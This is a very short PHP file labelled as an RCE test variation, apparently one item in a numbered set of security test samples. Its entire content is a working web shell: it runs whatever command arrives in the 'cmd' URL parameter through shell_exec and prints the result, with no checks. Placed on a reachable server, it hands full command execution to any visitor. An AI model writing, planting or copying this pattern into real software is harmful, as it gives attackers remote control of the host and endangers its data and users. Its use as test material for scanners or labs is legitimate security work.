<?php
// RCE test variation #190
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>